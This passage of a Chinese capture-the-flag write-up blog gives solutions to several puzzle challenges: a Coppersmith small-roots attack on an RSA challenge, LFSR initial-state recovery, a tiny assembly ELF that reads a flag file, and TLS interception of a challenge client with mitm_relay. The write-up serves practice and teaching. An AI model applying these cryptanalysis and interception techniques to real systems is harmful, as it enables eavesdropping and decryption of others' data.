aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-.25em"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:.03588em">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，得到：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>m</mi><mn>0</mn><mn>3</mn></msubsup><mo>+</mo><mn>3</mn><msup><mi>a</mi><mn>2</mn></msup><mi>b</mi><mi>i</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><msup><mi>a</mi><mn>3</mn></msup><mo stretchy="false">)</mo><msubsup><mi>m</mi><mn>0</mn><mn>2</mn></msubsup><mo>+</mo><mn>3</mn><mi>a</mi><msup><mi>b</mi><mn>2</mn></msup><mi>i</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><msup><mi>a</mi><mn>3</mn></msup><mo stretchy="false">)</mo><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><mo stretchy="false">(</mo><msup><mi>b</mi><mn>3</mn></msup><mo>−</mo><mi>c</mi><mo stretchy="false">)</mo><mi>i</mi><mi>n</mi><mi>v</mi><mo stretchy="false">(</mo><msup><mi>a</mi><mn>3</mn></msup><mo stretchy="false">)</mo><mo>≡</mo><mn>0</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">m_0^3+3a^2binv(a^3)m_0^2+3ab^2inv(a^3)m_0+(b^3-c)inv(a^3)\equiv 0 \bmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-.247em"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-2.4530000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.247em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:.03588em">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-2.4530000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.247em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mord">3</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:.03588em">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-.25em"></span><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:.03588em">v</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8641079999999999em"><span style="top:-3.113em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.69444em;vertical-align:0"></span><span class="mord">0</span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.05555555555555555em"></span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span></span></span></span></span></p><p>正是我们要的首一多项式，丢给 SageMath 一下子就解出来了，然后还原成字符串即可拿到 flag。</p><pre><code class="hljs makefile">N = 17022643406514350347573614465221696412722093893069884767243788880650197186586896695677232954756001085570908846778062553748252730496162774516963609020852021240663517062164143433972096285671583857300879566762429174925637808711899529732967964744088548497546563683172958195418996012865897850179068749931908849579004796030024201648134080256899877361133867143808268771425201158477438673553801559428342889346934705891370908283804031253368466095743470387105335979770140651537303634622746448342605800452083233872484864431450513349565059478371458778685883614230275550760174388677496289114774270577941915682644246153516217470289
cof1 = 7654811310494849798021593535838957164034235239444593486205902159219993926421703675382736379329695891056904149081520547693861134062326098641389076541695740273615825257074586144622272910435465399715878203827537912088549315112808698014263369037918752081172098277372015885102097148298774484125035157739560166495842652029217779403218833310083665224557484221080290003975621827166977961990907179524063242111250847516013776097469541369552121244027979749433406775448931648249048677669133375387657003666276481492775575045012202432238970376100782343002959674306700372647624197337455195019109593666495172341887440308820013321239711500650037549866392293571023406341581272032258884724631008499748540838526080846262329434540196946704941997607070368055096300149231001524974354362242290850539574671138929750078905495728709989761653139350608623351763588394153115266889332314799543522123944869140564794761462407715376789008289297666606580806445423650578459257833446017201266484489232192503190476268978188967560202382641258574743980457090723073685275243864523774890972040243532284179922357320211299391576450146967424476092164536708808786453218538228046110651007766008465069360981098347660922986353534005016703001280857498611505379926430531377684940286187235419934660411981564640971927277585368605013499282800347012605475784878876658114151396049986055252777480623330163491162286948543267881193465776183061720969252071807174119752317677240077013904888955743916764740416213159233248705300095471477946003728069943810518643625544048336096645492268396294902917376777374710548820606726679829973268919708139536446996018991091037080507910108031213136873912997484407049136407524930800997023573109785579998096386020014617612624226217429318823142428722478013610513259570813165411489809668110292268019470478612033821306423824198055594015181282411844750920121928098666451183568631842860947202235633688078282490134227984608930764275993375714782570069572972385163479851595411608898886016021357537686984211550946073052389619548721727524791028368296749663958192484843361421518944692856474123045634905622051718021050098150535474912151674042866007298338223422826435477106751941424146991389196817461134933944899013297900453019373646535519104270109209483142764331015835314416796973382730918278662431581084797266969132054681948475932606176771846573170675271315147832706338578837639590335828082150572278872196493572996251984818196755538381848175512540234665456166483025031150321611008100430334834466691990201664038194633149094316290024648166890101326327329853839595260717240590518708346315806525474328106496722045407192145765309300301279529166880677987677953898044837945676271058541238676364131941619282890367078050354185504881727895408554721469475831056724047431356484508560444484614228508332735300322190760116569626766163917876758870999957114051716788028849750214499415840044346083964165059675360859703331795471145336257825223149623571605708457646256220550406699742879044904821369720949579582839342628722408980240590388167597485077346062248672195253060515834254538311362839230760069268120063806798627852550023831716865619641828556927151302522637544989606854444179517897493746509051369139634737000666856460565542326944167245402284030364095481289608297378400313749602466206279795444081719150470562695110251163487809884174874619498498748519816292463690956911748817685310633148759794795505996488774692645109760
cof2 = 30018867884293528619692523669956694760918569566449386220415302585176446770281190883853868154234101533556486859143217834093573074754219994672114025653708785386728726498331710371067736903668491763591679230696227106229605157305132149075542623678112753259498424617145160333733714307054017584804059442115922221552324125604775605502818954157190844017872487141491333348924007165360697890160420311859071537691179794180446180774390358311969102917756783331111399119407575091172739912427974021128066681044221496050099735821921026232223806004629270625439348760884032123993124751524435291770694298367921749818375768759848822720589261659147314469772137180239928013748688221048561868551112287252009963775962651402018062402276849713961757813217748767892321696449318437882881048510802237481015286879165480045302383979733225851700339051690971509535713399173901274068899207913136520332032146344681013815614452648924026183249327624637425057690257739971978521921223751197397536011431725428868555944672709948073557902250311760103002014383079413337392688687066901312054133450274218394568368194058181640958749645380036801679205882852514323441267209442231054327503952120776479487794231297836307072935019376482760723288863455310179906607151903164503892487610528174876743117365993401037529566949312481848879563235609138010365381176726084326180589252355082827750084471514860433262183247361644552185702863353006180234194903879166590991851862742813912282942986826665730661880846396992349434485403404256799202588263619638195294798705542507825307743342885567472568662720449185700892563020720610050671706197248920313974880155282598764839971472984398202291683254151446959918200762941623418469254170314468520205603903903899488981462999811491188125929270565137441077566149023370210069849172143822335046912717225469769936297884065179119242885579397010301002269587025914412843839914485697156425835627326716120072517564835218176486762894277926849166546012797338773719752505879249820586468152881040752941710144094587652405208394474267682635307995555525363991847125278887508182299819757906767298175330658428104620353412651155102122443366942626261131446083653305564097406482708590827433754698726560824042156257389472460812810597643320615196810559003395551284485202617125945949427501548846537405927429764206673125385012334174079195305598468617287415793008103738135227973230749174741295203138265239800923952332395245756743289195713173195741862139060507186975686600042417162792280875368907990375864640374798732287821053226608250054916026034092368145308792329262980836014584645525944889929415902544065242598854005401727147258086776685307623571173511976026326987990520637480949369488868989658013215152581219067366904431437240787162705143625208544493269822842430693688134094157777583640605055668970611905563257125338530784586047061543658777057217021040442472653590599034561748863889357725215129066597092547411303547656971467282965987074522134192605023423240795135416495190235631598988949530266738346726214560994715402558526849405618488358810286021830007817450888972084306350626575143423375807780403032226906706955899470114782969437841974037506865811568281024354878124991629128153143875203404431965544681030413307290390215345627072958376971523100405044212825344700662604170782254201107514512785175420970824053606516818581042803785426295414829220452676745422250758793731435287462398982895726902059653760915865600
cof3 = 39240350175547096234892187803864960471788979825424034275052683117877708196446001155364533534946537952361420730906167103390291600985908489767469314580011484165658466010891124668062401181266002305348600301563695563698830270987100848464761599579232357201958724989732235730370868375234009914776548290347610747127221079221928896082116279944040318977611094302603050129312427667138167176680287989358263447962326528340452523888091971649632814271577494550472417149552385740095084852847024864219695007900943132091632911568204644091734823458978063185806014065073207794893602080943261841773392277335101474127818540349623920370425794927669321182711252945540637604358578601576356110400801014987961249197564379693794091455189011443883401189972992457106178470023946696374701937092230425553137109507807074576574703749507805688096987194729139287512240139354281863428164878743560588733627834251681416128165620624004259641844045032082907400110379335069981300334226208431753590250634589732373577084686277311807103276722282688837913731195134048183289067621640430989624148816788995128501545721996140099295554433108919311070485628891947019383572153719750407871001733949057431577246074550543189306242762757699910199959902946184011503783628256674199215347846840726975782219114159641085860086414025175948565787542328903968242883836419757374745875926362908560338124755068980617571084160208483845597633787220447674081618482183304587700299637719270194217954336774618614761057060445322904217760402149606234230234302232759103676434981447230542299109447427775005766313755821441238165211350181744636224228453354251651472109452213189641139073800646444437554095818867555684110498743401824984129483326085164268142037569312850346992836253816662691814308306066751201732513208148017135467612366789153330256282171799572120460656599488725486182486876335222184968377965721058296966068957511692718983503909228047244716399998529199026345992531138976540366453595195701606194210123590477580168194694146485736432018226116334534707446748137095303434545495055861972645991670163332437953899743106661588367428541604360660558545566026838364373491953980010610470370575205595598918844806713372824955674656370126094395701956907293581769521981097737197049881248985908913802971483223758674642843664201808554870230952745128060972894057166174723448868678329015589384519681087622200201266454666641111034903739342739873719757121069678001193943487341037956064753176061864464400035509398198462333346446342145417758561516678299614988165293709844341137829745650317819716736245409534211537931474309649542643293481286288108797327082686032394262301806725714569926174658929032104358665346977612008826410052558251972505037604399993750875103732687980917598622794581557133564086619925370579974593904531599777401570987596226784788654464565211237426672053166320728447739096976380591661249138445693592809866686403424563905424497966766748347272172880406298580777009884403887002203251457975855284962288330010420556134912152780888099564887662839035605664244082866608935844317022220209078946185862137792168015223559804396482891997684868538235454373686259958357034596434430354461788642538590329890051467533742307518442025530266984906935369316068909171346312771211827790199946570041763324911386460809428364450519721603256193315668640567410592417158688381768489441223895776025034954387417934757392573701580193782051157294576846637940679852416
ZmodN = Zmod(N)
P.&lt;x&gt; = PolynomialRing(ZmodN)
f = x^3 + cof1*x^2 + cof2*x + cof3
x0 = f.small_roots()
print(x0)</code></pre><p>（<code>cof1</code>、<code>cof2</code> 和 <code>cof3</code> 分别为二次项系数、一次项系数和常数项，预先用 Python 计算好了）</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_dd37f8c9ed4ada0828e42fb35f048240.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_dd37f8c9ed4ada0828e42fb35f048240.png?width=1920" srcset="/loading.gif" alt=""></p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_75f7f33988508e8b8d8542299145085e.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_75f7f33988508e8b8d8542299145085e.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="rsfl"><a class="markdownIt-Anchor" href="#rsfl"></a> RSFL</h3><p>经过一番检索发现这是道非常标准的 LFSR 题目，直接根据网上的例子依葫芦画瓢求得初态 R。</p><pre><code class="hljs python">mask = <span class="hljs-number">0x9e393e7126c18da37dc14f9a3113c50c8ad4a522ae4501b20531</span>
mask = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(mask))[<span class="hljs-number">2</span>:]
key = <span class="hljs-number">0xc9fe198703d93a7cff319d81c311b169de4b8d528d2dbec4859b</span>
key = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">bin</span>(key))[<span class="hljs-number">2</span>:]

tmp = key

bits = [<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">18</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">33</span>, <span class="hljs-number">35</span>, <span class="hljs-number">39</span>, <span class="hljs-number">42</span>, <span class="hljs-number">43</span>, <span class="hljs-number">44</span>, <span class="hljs-number">46</span>, <span class="hljs-number">48</span>, <span class="hljs-number">50</span>, <span class="hljs-number">54</span>, <span class="hljs-number">57</span>, <span class="hljs-number">59</span>, <span class="hljs-number">62</span>, <span class="hljs-number">64</span>, <span class="hljs-number">67</span>, <span class="hljs-number">69</span>, <span class="hljs-number">71</span>, <span class="hljs-number">72</span>, <span class="hljs-number">74</span>, <span class="hljs-number">76</span>, <span class="hljs-number">80</span>, <span class="hljs-number">83</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">91</span>, <span class="hljs-number">95</span>, <span class="hljs-number">96</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">110</span>, <span class="hljs-number">114</span>, <span class="hljs-number">116</span>, <span class="hljs-number">117</span>, <span class="hljs-number">120</span>, <span class="hljs-number">121</span>, <span class="hljs-number">122</span>, <span class="hljs-number">123</span>,
        <span class="hljs-number">124</span>, <span class="hljs-number">127</span>, <span class="hljs-number">129</span>, <span class="hljs-number">135</span>, <span class="hljs-number">136</span>, <span class="hljs-number">137</span>, <span class="hljs-number">139</span>, <span class="hljs-number">140</span>, <span class="hljs-number">141</span>, <span class="hljs-number">142</span>, <span class="hljs-number">143</span>, <span class="hljs-number">145</span>, <span class="hljs-number">146</span>, <span class="hljs-number">150</span>, <span class="hljs-number">152</span>, <span class="hljs-number">153</span>, <span class="hljs-number">155</span>, <span class="hljs-number">156</span>, <span class="hljs-number">160</span>, <span class="hljs-number">161</span>, <span class="hljs-number">167</span>, <span class="hljs-number">168</span>, <span class="hljs-number">170</span>, <span class="hljs-number">171</span>, <span class="hljs-number">174</span>, <span class="hljs-number">177</span>, <span class="hljs-number">181</span>, <span class="hljs-number">182</span>, <span class="hljs-number">183</span>, <span class="hljs-number">186</span>, <span class="hljs-number">187</span>, <span class="hljs-number">188</span>, <span class="hljs-number">189</span>, <span class="hljs-number">190</span>, <span class="hljs-number">193</span>, <span class="hljs-number">196</span>, <span class="hljs-number">197</span>, <span class="hljs-number">198</span>, <span class="hljs-number">202</span>, <span class="hljs-number">203</span>, <span class="hljs-number">204</span>, <span class="hljs-number">205</span>]

R = <span class="hljs-string">''</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">208</span>):
    output = <span class="hljs-string">'?'</span> + key[:<span class="hljs-number">207</span>]
    ans = <span class="hljs-built_in">int</span>(key[-<span class="hljs-number">1</span>])
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> bits:
        ans = ans ^ <span class="hljs-built_in">int</span>(output[-j])
    R += <span class="hljs-built_in">str</span>(ans)
    key = <span class="hljs-built_in">str</span>(ans) + key[:<span class="hljs-number">207</span>]

R = [R[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(R), <span class="hljs-number">8</span>)]
<span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> R:
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(c, <span class="hljs-number">2</span>)), end=<span class="hljs-string">''</span>)</code></pre><p>不过这样做下来，结果却是乱码。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_14c944b606c204b7758f49abe5560ba8.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_14c944b606c204b7758f49abe5560ba8.png?width=1920" srcset="/loading.gif" alt=""></p><p>想想明明是 LFSR 为啥题目叫 RSFL 呢？尝试把最后的 R 二进制倒转一下，也就是<code>R = R[::-1]</code>，然后就成功拿到了 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_19b87bc3dd926b608e574a6e4818535d.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_19b87bc3dd926b608e574a6e4818535d.png?width=1920" srcset="/loading.gif" alt=""></p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="tiny-elf"><a class="markdownIt-Anchor" href="#tiny-elf"></a> Tiny ELF</h3><p>要构造一个不超过三百字节的可执行文件，显然不能用 C 来写，只能用汇编了。然而我并不会汇编，好在找到了<a target="_blank" rel="noopener" href="https://github.com/geyslan/SLAE/blob/master/5th.assignment/tiny_read_file.asm">现成的代码</a>，把读取的文件路径以及返回值改改就能用。</p><pre><code class="hljs assembly">; Tiny Read File - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
;
; Program modified by Hans362

global _start

section .text

_start:

	; int open(const char *pathname, int flags);

	xor ecx, ecx
	mul ecx
	mov al, 5
	push ecx
	push 0x6761
	push 0x6c662f2f
	mov ebx, esp
	int 0x80

	; ssize_t read(int fd, void *buf, size_t count);

	xchg eax, ebx
	xchg ecx, eax
	mov al, 3
	xor edx, edx
	mov dx, 0x20
	inc edx
	int 0x80

	; ssize_t write(int fd, const void *buf, size_t count);

	xchg edx, eax
	xor eax, eax
	mov al, 4
	mov bl, 1
	int 0x80

	; void _exit(int status);
  
	mov eax, 1
	mov ebx, 42
	int 0x80</code></pre><p>使用 <code>nasm -f elf32 tinyelf.asm</code> 编译，此时如果直接 <code>ld -m elf_i386 tinyelf.o -o tinyelf</code> 进行链接，得到的可执行文件非常庞大，远超三百字节，因此我们需要自定义一下链接的过程。创建一个 <code>tinyelf.lds</code> 文件，内容如下：</p><pre><code class="hljs ada"><span class="hljs-keyword">ENTRY</span>(_start)
SECTIONS
{
  . = <span class="hljs-number">0</span>x400000 + SIZEOF_HEADERS;
  main : { *(.<span class="hljs-type">text</span>) *(.rodata) }
  /DISCARD/ : { *(.<span class="hljs-type">symtab</span>) *(.strtab) }
}</code></pre><p>然后使用 <code>ld -m elf_i386 -s -static -T tinyelf.lds -o tinyelf tinyelf.o</code> 进行链接，得到的可执行文件就只有320字节了，但依然不符合题目的要求。这时再用一下 <a target="_blank" rel="noopener" href="https://github.com/aunali1/super-strip">super-strip</a> 进一步缩减文件（写给官方的解题报告里漏了这步），就只剩下183字节了，base64 一下提交即可拿到 flag。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_902eef595b15805db2f52df18ec0b716.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_902eef595b15805db2f52df18ec0b716.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="baby-mitm"><a class="markdownIt-Anchor" href="#baby-mitm"></a> Baby Mitm</h3><p>题目已经明示用中间人攻击。先用 WireShark 抓了下包，发现是 TLSv1.3 加密，但包裹的应该并非 HTTP 协议，因此 Fiddler 等工具都用不了。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3f06825e767e14d4799dfd4772e176bf.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_3f06825e767e14d4799dfd4772e176bf.png?width=1920" srcset="/loading.gif" alt=""></p><p>那么有没有适用于非 HTTP 协议的中间人攻击工具呢？找了很久终于发现了 <a target="_blank" rel="noopener" href="https://github.com/jrmdev/mitm_relay">mitm_relay</a>，完全符合需求。</p><p>可惜不知道我电脑上的 Python 是不是有什么问题，按照 README 配置好了证书，并且把 <code>client</code> 的流量重定向到了 Proxy，然而每次运行 <code>client</code> mitm_relay 都会崩溃，导致我一度以为这个办法行不通。</p><p>后来开了个 Docker 容器搞了个干净的 Python 环境，然后竟然就正常了，成功抓到了 flag 信息并完成了解密。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_fd2bc81cdfd4e85618401c3b846b4ce2.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_fd2bc81cdfd4e85618401c3b846b4ce2.png?width=1920" srcset="/loading.gif" alt=""></p><p>可这解密出来的信息还是一团糟啊？而且每次返回的信息都不同，难道还有加密？多观察了几次我发现含有 flag 的信息总是以 <code>78 9C 64</code> 开头，似乎是某种文件头，Google 一下发现原来是 zlib 压缩的标记，解压一下即可。</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib

d = <span class="hljs-string">"789C6450BB6EE33010ECF51553DE013A430759B65CA64C1F2035A55D9A4464AEB05CC55182FC7B40C5888B6C399C1707780AB2C07499567817B5C695D56E405E2FB3B310DF99EA0A784C0567CC938B095751CA35861516D6EDE19FF134C57486D7C8897615003C2482058E8AB34ACE985D4C564897780E868131B0192B96FC9D023C0756C618985F321233619844A8464CC58A110D31C30D45B2ABAA4DF4EBFAB65446E25756647785056758650145BAD728FE25F6D653D98B324C0A53B74990E44ECF6CDB14F0B224C21F515890A57CE586FDFDC9E0B771332FD7C89C3F4E27DF776DBB1F8FAEEBF64DC387664FED70ECFB7E3C75E48F7468FE7B1A3FBF020000FFFF7E80816F"</span>

d = <span class="hljs-built_in">bytes</span>.fromhex(d)
m = zlib.decompress(d)
m = m.decode(<span class="hljs-string">"utf-8"</span>)

<span class="hljs-built_in">print</span>(m)</code></pre><p>解出的明文上半部分是莎士比亚的诗随机摘录的一部分，最底下是 flag，这也解释了为什么每次返回的信息都不同。</p><p><img src="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5515d8adf6357104b24cd80992209410.png?width=1920" class="lazy" data-srcset="https://hans362-img.oss.0vv0.top/2023/03/12/upload_5515d8adf6357104b24cd80992209410.png?width=1920" srcset="/loading.gif" alt=""></p><h3 id="baby-equation"><a class="markdownIt-Anchor" href="#baby-equation"></a> Baby Equation</h3><p>求解这个方程的正整数解。</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mi>x</mi><mrow><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mfrac><mo>+</mo><mfrac><mi>y</mi><mrow><mi>x</mi><mo>+</mo><mi>z</mi></mrow></mfrac><mo>+</mo><mfrac><mi>z</mi><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow></mfrac><mo>=</mo><mi>k</mi><mo separator="true">,</mo><mtext>&nbsp;</mtext><mi>k</mi><mo>∈</mo><mo stretchy="false">{</mo><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>8</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>12</mn><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\frac{x}{y+z}+\frac{y}{x+z}+\frac{z}{x+y}=k,{\ }k\in\{2, 4, 6, 8, 10, 12, 14\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.9880000000000002em;vertical-align:-.8804400000000001em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em"><span style="top:-2.314em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal" style="margin-right:.03588em">y</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mord mathnormal" style="margin-right:.04398em">z</span></span></span><span style="top:-3.23em"><span class="pstrut" style="height:3em"></span><span class="frac-line" style="border-bottom-width:.04em"></span></span><span style="top:-3.677em"><span class="pstrut" style="height:3em"></span><span class="mord"><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.8804400000000001em"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" 